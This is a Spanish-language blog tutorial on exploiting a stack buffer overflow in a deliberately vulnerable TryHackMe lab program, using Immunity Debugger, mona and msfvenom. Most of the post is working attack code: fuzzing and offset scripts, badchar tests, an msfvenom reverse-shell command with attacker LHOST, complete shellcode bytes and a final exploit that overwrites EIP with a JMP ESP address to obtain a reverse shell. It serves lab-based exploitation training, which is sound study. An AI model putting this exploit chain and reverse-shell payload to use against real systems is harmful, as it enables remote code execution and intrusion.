---
title: Explotando Buffer Overflow paso a paso
categories: [Explotación de binarios]
image: BufferOverflow.png
img_path: /assets/Cursos/BufferOverflow/
---

Holaa, bienvenidos a este post en el cual voy a estar explicando como explotar un Stack Buffer Overflow paso a paso, esta sería la continuación del post anterior, en el cual enseño los conceptos básicos sobre Buffer Overflow.

¿Empezamos?

# Preparación del entorno.

Para la práctica voy a estar utilizando un programa el cual extraje de una máquina de la plataforma TryHackMe, el programa en cuestión es este.

- ```https://www.mediafire.com/folder/44ypq50ahuvrg/BoF```

También estaremos usando el programa ```Immunity Debugger```

- ```https://www.immunityinc.com/products/debugger/```

Recordemos que para poder llevar a cabo esta práctica, debemos disponer de 2 máquinas, una Windows (en mi caso es un Windows 11) en la cual estaremos ejecutando el programa vulnerable a Buffer Overflow y el Immnity Debugger, y otra Linux desde la cual vamos a estar explotando (en mi caso es una Kali Linux).

Al ejecutar el programa vulnerable a Buffer Overflow, veremos esto.

<img src="ejecucion-buffer.png">

Al ejecutarlo se nos desplegará esa consola en la cual nos indica que el programa está corriendo en el puerto 1337

Para verificar que el programa está corriendo perfectamente, nos conectaremos con netcat por el puerto anteriormente indicado.

<img src="connection.png">
  

Como podemos confirmar, el programa está corriendo de manera exitosa, nosotros estaremos practicando con el nivel 1, es decir "OVERFLOW1".

Ahora procederemos a abrir el programa ImmunityDebugger

<img src="ImmunityDebugger.png">

A simple vista no tiene una interfaz muy llamativa, presionaremos en la pestaña que dice "File" luego le daremos a "Attach" y se nos desplegara un listado con los programas que tenemos corriendo actualmente en nuestro sistema, buscaremos el que diga oscp.

Al sincronizarnos con el proceso, veremos esto.

<img src="attach-one.png">

Por defecto abajo a la izquierda nos saldrá en "Paused", debemos apretar el boton de "Play" para que se ponga en "Running".

# Fuzzing

Para empezar a explotar este Stack Buffer Overflow, debemos saber la cantidad de bytes con las cuales corrompe el programa, para poder saber la cantidad de bytes que debemos inyectar vamos a hacer uso de este script en Python3.

```py
#!/usr/bin/python3

from pwn import *

if len(sys.argv) < 2:
    print("\n[!] Uso: python3 %s <ip-address>\n" % sys.argv[0])
    sys.exit(1)

# Variables globales

ipAddress = sys.argv[1]
rport = 1337
prefijo = "OVERFLOW1 "
timeout = 5
if __name__ == '__main__':
    buffer = ["A"]
    contador = 100
    while len(buffer) < 32:
        buffer.append("A"*contador)
        contador += 100

    p1 = log.progress("Data")
    for i in buffer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ipAddress, rport))
            data = s.recv(1024)
            payload = prefijo + i
            s.send(bytes(payload, "latin-1"))
            p1.status("Enviando %s bytes" % len(i))
        except:
            print("[!] Error de conexion")
            sys.exit(1)
```

Al ejecutar este script veremos esto.

<img src="fuzzing.png">

Al parecer la conexión finalizo al enviar 2000 bytes, vamos a ver que paso en el Immunity Debugger

<img src="immunity-fuzz.png">

Como vemos el estado del programa paso de "Running" a "Paused", esto quiere decir que lo hemos crasheado, y tanto el valor del EIP y EBP cambio a "41414141"

## ¿Por qué tienen estos valores?

Bueno, como nosotros mandamos más bytes de los cuales el programa soporta, hemos empezado a sobrescribir los registros con la letra "A" y la letra "A" representada en hexadecimal es 0x41

# Control de EIP

Una vez tengamos la cantidad de bytes con la que el programa corrompe (en este caso 2000), vamos a hacer uso de la utilidad ```msf-pattern_create```, para así poder saber la cantidad exacta de bytes con la cual sobrescribimos el EIP.

Para poder saberlo ejecutaremos el siguiente comando.

<img src="pattern-create.png">

El output del comando es lo que vamos a enviar ahora.


```py
#/usr/bin/python3 

from pwn import *
import socket
import time

if len(sys.argv) < 2:
    print("\n[!] Uso: python3 " + sys.argv[0] + " <ip-address>\n")
    sys.exit(1)


# Variables globales
ipAddress = sys.argv[1]
rport = 1337 
timeout = 5
if __name__ == '__main__':

    buffer = "" # <- pattern_created result
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ipAddress, rport))
        data = s.recv(1024)
        prefijo = ("OVERFLOW1 %s" % buffer) # <- Funcion a enviar el payload
        s.send(bytes(prefijo, "latin-1"))
    except:
        print("[!] Error de conexion")
        sys.exit(1)

```

<img src="payload.png">

Antes de ejecutar el script, debemos reiniciar el Immunity Debugger, ya que el programa se corrompió y debemos ejecutarlo de nuevo.

Una vez lo hacemos y ejecutamos el script veremos esto.

<img src="create-result.png">

Luego de enviar el payload, el EIP se reemplaza por "6F43396E", para poder saber el buffer exacto con el cual se reemplaza vamos a hacer uso de la utilidad ```msf-pattern_offset```

<img src="pattern-offset.png">

con el parámetro ```-q``` le indicamos la dirección del EIP

Como vimos en el output del comando anterior, la cantidad de bytes que debemos enviar para sobrescribir el EIP es de 1978, vamos a mandar 1978 "A" y 4 "B", si EIP vale 42424242, ya podemos saber que tenemos el control del EIP, para esto vamos a modificar la variable buffer del script anterior y le pondremos esto.

```buffer = "A"*1978 + "B"*4```

<img src="eip-b.png">

# Badchars

Una vez ya tenemos el control del EIP debemos encontrar cuáles son los badchars, los badchars son caracteres los cuales el programa no soporta.

Para poder detectarlos vamos a hacer uso del módulo ```mona.py``` el cual pueden descargar desde aquí.

- https://raw.githubusercontent.com/corelan/mona/master/mona.py

Una vez lo descargamos, debemos moverlo a la carpeta "PyCommands" del programa Immunity Debbuger, normalmente se encuentra aqui.


```C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands```

Para poder verificar que lo tenemos correctamente instalado podemos poner "!mona"

<img src="mona.png">

Una vez que confirmamos que tenemos el script de mona instalado, vamos a configurar nuestro entorno de trabajo.

```!mona config -set workingfolder C:\mona\%p```

<img src="workingfolder.png">

Esto nos creará una carpeta en la ruta C:\mona y con el %p le indicamos que el nombre será el mismo del programa al cual estamos sincronizados.

Ahora crearemos un archivo que contenga un array de bytes, este archivo lo estaremos usando más adelante.

```!mona bytearray -cpb "\x00"```

<img src="bytearraygen1.png">

Si revisamos la ruta que le indicamos anteriormente veremos que se nos ha creado una carpeta y dentro de ella 2 archivos llamados ```bytearray.bin``` y ```bytearray.txt```

<img src="filesbyte.png">

<img src="bytearray.txt.png">

Copiaremos la cadena generada para luego enviarla.

```py
#!/usr/bin/python3 

from pwn import *

if len(sys.argv) < 2:
    print("\n[!] Uso: python3 %s <IP>\n" % sys.argv[0])
    sys.exit(1)

# Variables globales
ipAddress = sys.argv[1]
rport = 1337
timeout = 5
prefijo = "OVERFLOW1 " # <- campo a inyectar 

badchars=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

if __name__ == "__main__":
    buffer = "A"*1978 + "B"*4 + badchars # <- Las "C" fueron reemplazadas por los badchars
    try:      
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ipAddress, rport))
        data = s.recv(1024)
        payload = (prefijo + buffer)
        s.send(payload.encode("latin-1"))
    except: 
        print("Error de conexion")
        sys.exit(1)
```

Una vez enviado el payload, tomaremos el valor del ESP para hacer la búsqueda de los badchars

<img src="compareesp1.png">

<img src="badchars1.png">

Como vemos el script de mona nos reportó los posibles badchars, ahora generaremos otro archivo de bytearrays pero omitiendo los posibles badchars 

<img src="bytearraygen2.png">

Ahora debemos retirar el badchard ```"\x07"``` del payload

<img src="quitbadchard1.png">

Ejecutamos el exploit.

<img src="valoresp2.png">

Y ahora repetimos los pasos que hicimos anteriormente.

<img src="compareesp2.png">

Ya tenemos 3 badchars detectados, vamos a eliminarlos del archivo bytearray.bin.

<img src="bytearraygen3.png">

Ahora lo eliminamos de nuestro payload.

<img src="badchars2.png">

Y volvemos a ejecutar el exploit.

<img src="compareesp3.png">

<img src="badchars3.png">

Eliminamos en carácter ```\xa0``` del archivo ```bytearray.bin```

<img src="bytearraygen4.png">

Y lo eliminamos del payload.

<img src="quitbadchard4.png">

Volvemos a ejecutar el exploit.

<img src="compareesp4.png">

<img src="badchars4.png">

Como vemos ya no nos detecta ningún badchars, por ende sabemos que los badchars son 

> x00 
> x07
> x2e
> xa0

# Msfvenom

Ahora debemos generar las instrucciones maliciosas que queremos que se ejecuten, para eso vamos a generarnos una reverse shell haciendo uso de msfvenom.

```msfvenom -p windows/shell_reverse_tcp LHOST=<Nuestra IP> LPORT=<Puerto> EXITFUNC=thread -b "<BADCHARS>" -f c```

El comando final quedaría así (en mi caso)

```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.29 LPORT=443 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c```

<img src="msfvenom.png">

```py
#!/usr/bin/python3 

from pwn import *

if len(sys.argv) < 2:
    print("\n[!] Uso: python3 %s <IP>\n" % sys.argv[0])
    sys.exit(1)

# Variables globales
ipAddress = sys.argv[1]
rport = 1337
timeout = 5
prefijo = "OVERFLOW1 " # <- campo a inyectar 

shellcode=("\xdb\xc0\xb8\x6c\x90\x63\xb6\xd9\x74\x24\xf4\x5a\x33\xc9"
"\xb1\x52\x31\x42\x17\x03\x42\x17\x83\xae\x94\x81\x43\xd2"
"\x7d\xc7\xac\x2a\x7e\xa8\x25\xcf\x4f\xe8\x52\x84\xe0\xd8"
"\x11\xc8\x0c\x92\x74\xf8\x87\xd6\x50\x0f\x2f\x5c\x87\x3e"
"\xb0\xcd\xfb\x21\x32\x0c\x28\x81\x0b\xdf\x3d\xc0\x4c\x02"
"\xcf\x90\x05\x48\x62\x04\x21\x04\xbf\xaf\x79\x88\xc7\x4c"
"\xc9\xab\xe6\xc3\x41\xf2\x28\xe2\x86\x8e\x60\xfc\xcb\xab"
"\x3b\x77\x3f\x47\xba\x51\x71\xa8\x11\x9c\xbd\x5b\x6b\xd9"
"\x7a\x84\x1e\x13\x79\x39\x19\xe0\x03\xe5\xac\xf2\xa4\x6e"
"\x16\xde\x55\xa2\xc1\x95\x5a\x0f\x85\xf1\x7e\x8e\x4a\x8a"
"\x7b\x1b\x6d\x5c\x0a\x5f\x4a\x78\x56\x3b\xf3\xd9\x32\xea"
"\x0c\x39\x9d\x53\xa9\x32\x30\x87\xc0\x19\x5d\x64\xe9\xa1"
"\x9d\xe2\x7a\xd2\xaf\xad\xd0\x7c\x9c\x26\xff\x7b\xe3\x1c"
"\x47\x13\x1a\x9f\xb8\x3a\xd9\xcb\xe8\x54\xc8\x73\x63\xa4"
"\xf5\xa1\x24\xf4\x59\x1a\x85\xa4\x19\xca\x6d\xae\x95\x35"
"\x8d\xd1\x7f\x5e\x24\x28\xe8\xa1\x11\x33\xf5\x49\x60\x33"
"\x04\x31\xed\xd5\x6c\x55\xb8\x4e\x19\xcc\xe1\x04\xb8\x11"
"\x3c\x61\xfa\x9a\xb3\x96\xb5\x6a\xb9\x84\x22\x9b\xf4\xf6"
"\xe5\xa4\x22\x9e\x6a\x36\xa9\x5e\xe4\x2b\x66\x09\xa1\x9a"
"\x7f\xdf\x5f\x84\x29\xfd\x9d\x50\x11\x45\x7a\xa1\x9c\x44"
"\x0f\x9d\xba\x56\xc9\x1e\x87\x02\x85\x48\x51\xfc\x63\x23"
"\x13\x56\x3a\x98\xfd\x3e\xbb\xd2\x3d\x38\xc4\x3e\xc8\xa4"
"\x75\x97\x8d\xdb\xba\x7f\x1a\xa4\xa6\x1f\xe5\x7f\x63\x3f"
"\x04\x55\x9e\xa8\x91\x3c\x23\xb5\x21\xeb\x60\xc0\xa1\x19"
"\x19\x37\xb9\x68\x1c\x73\x7d\x81\x6c\xec\xe8\xa5\xc3\x0d"
"\x39")
if __name__ == "__main__":
    buffer = "A"*1978 + "B"*4 + shellcode
    try:      
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ipAddress, rport))
        data = s.recv(1024)
        payload = (prefijo + buffer)
        s.send(payload.encode("latin-1"))
    except: 
        print("Error de conexion")
        sys.exit(1)

```

# JMP ESP

Una vez tengamos definido el shellcode y lo logremos meter en la pila, debemos poner que el EIP apunte al ESP y asi el shellcode se ejecute, pero no es tan fácil como indicarle nosotros la dirección y ya, o sea si podemos hacerlo pero el shellcode no se ejecutara

Debemos poner que el EIP apunte a una dirección que aplique un salto al ESP

<img src="nasmshell.png">

Ahora que sabemos que el opcode es FFE4, dentro del ImmunityDebugger pondremos

```!mona modules```

<img src="monamodules.png">

Al listar los módulos veremos que tenemos el primero de la fila con todo en "False", esto quiere decir que no tiene ninguna protección asignada.

<img src="false4.png">

Una vez tengamos el DLL a usar o .exe, pondremos lo siguiente

```!mona find -s "\xff\xe4" -m essfunc.dll```

Luego de eso, nos tendremos que quedar con alguna de las direcciones que nos saldrán a la izquierda, es importante que estas direcciones no contengan los badchars que anteriormente habíamos detectado.

En mi caso me quedaré con la primera dirección, es decir, la "0x625011af"

<img src="monafind.png">

En mi caso me quedaré con la primera dirección, es decir, la "0x625011af", esta la buscaremos en el siguiente apartado del ImmunityDebugger

<img src="jmpesp.png">

Luego de eso se nos posicionara en esa dirección y podremos ver que se esta haciendo un salto al ESP

<img src="jmpespok.png">

# Explotación

Una vez ya tengamos todo preparado para poder explotar este buffer overflow, vamos a hacer los cambios en el exploit.

Lo primero que vamos a hacer es cambiar el valor de EIP por la dirección que elegimos pero en formato Little Endian, es decir, hay que rotarla.

La dirección "0x625011AF" en Little Endian se vería así

> AF115062

En mi Github tengo un script el cual se encarga de poner en forma automática una dirección en little endian 

- ```https://github.com/0nyxMind/Little-endian```

Aparte de cambiar la dirección del EIP, vamos a agregarle unos NOPS, para que todo vaya correcto.

El exploit final quedaría así.

```py
#!/usr/bin/python3 

from pwn import *

if len(sys.argv) < 2:
    print("\n[!] Uso: python3 %s <IP>\n" % sys.argv[0])
    sys.exit(1)

# Variables globales
ipAddress = sys.argv[1]
rport = 1337
timeout = 5
prefijo = "OVERFLOW1 " # <- campo a inyectar 

shellcode=("\xdb\xc0\xb8\x6c\x90\x63\xb6\xd9\x74\x24\xf4\x5a\x33\xc9"
"\xb1\x52\x31\x42\x17\x03\x42\x17\x83\xae\x94\x81\x43\xd2"
"\x7d\xc7\xac\x2a\x7e\xa8\x25\xcf\x4f\xe8\x52\x84\xe0\xd8"
"\x11\xc8\x0c\x92\x74\xf8\x87\xd6\x50\x0f\x2f\x5c\x87\x3e"
"\xb0\xcd\xfb\x21\x32\x0c\x28\x81\x0b\xdf\x3d\xc0\x4c\x02"
"\xcf\x90\x05\x48\x62\x04\x21\x04\xbf\xaf\x79\x88\xc7\x4c"
"\xc9\xab\xe6\xc3\x41\xf2\x28\xe2\x86\x8e\x60\xfc\xcb\xab"
"\x3b\x77\x3f\x47\xba\x51\x71\xa8\x11\x9c\xbd\x5b\x6b\xd9"
"\x7a\x84\x1e\x13\x79\x39\x19\xe0\x03\xe5\xac\xf2\xa4\x6e"
"\x16\xde\x55\xa2\xc1\x95\x5a\x0f\x85\xf1\x7e\x8e\x4a\x8a"
"\x7b\x1b\x6d\x5c\x0a\x5f\x4a\x78\x56\x3b\xf3\xd9\x32\xea"
"\x0c\x39\x9d\x53\xa9\x32\x30\x87\xc0\x19\x5d\x64\xe9\xa1"
"\x9d\xe2\x7a\xd2\xaf\xad\xd0\x7c\x9c\x26\xff\x7b\xe3\x1c"
"\x47\x13\x1a\x9f\xb8\x3a\xd9\xcb\xe8\x54\xc8\x73\x63\xa4"
"\xf5\xa1\x24\xf4\x59\x1a\x85\xa4\x19\xca\x6d\xae\x95\x35"
"\x8d\xd1\x7f\x5e\x24\x28\xe8\xa1\x11\x33\xf5\x49\x60\x33"
"\x04\x31\xed\xd5\x6c\x55\xb8\x4e\x19\xcc\xe1\x04\xb8\x11"
"\x3c\x61\xfa\x9a\xb3\x96\xb5\x6a\xb9\x84\x22\x9b\xf4\xf6"
"\xe5\xa4\x22\x9e\x6a\x36\xa9\x5e\xe4\x2b\x66\x09\xa1\x9a"
"\x7f\xdf\x5f\x84\x29\xfd\x9d\x50\x11\x45\x7a\xa1\x9c\x44"
"\x0f\x9d\xba\x56\xc9\x1e\x87\x02\x85\x48\x51\xfc\x63\x23"
"\x13\x56\x3a\x98\xfd\x3e\xbb\xd2\x3d\x38\xc4\x3e\xc8\xa4"
"\x75\x97\x8d\xdb\xba\x7f\x1a\xa4\xa6\x1f\xe5\x7f\x63\x3f"
"\x04\x55\x9e\xa8\x91\x3c\x23\xb5\x21\xeb\x60\xc0\xa1\x19"
"\x19\x37\xb9\x68\x1c\x73\x7d\x81\x6c\xec\xe8\xa5\xc3\x0d"
"\x39")
if __name__ == "__main__":
    buffer = "A"*1978 + "\xAF\x11\x50\x62" + "\x90"*20 + shellcode
    try:      
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ipAddress, rport))
        data = s.recv(1024)
        payload = (prefijo + buffer)
        s.send(payload.encode("latin-1"))
    except: 
        print("Error de conexion")
        sys.exit(1)
```
Ahora si nos ponemos en escucha por el puerto que especificamos anteriormente en el msfvenom y ejecutamos el exploit, veremos que nos llega la Reverse Shell:

<img src="final.png">

Hemos llegado al final de este post en el cual hice un intento de explicar la explotación de un Stack Buffer Overflow jaja, en caso de que no conozcan un concepto, le pueden echar un ojo a mi otro post en el cual explico los conceptos básicos.

> ```https://0nyxmind.github.io/posts/Conceptos-basicos-de-buffer-overflow/```

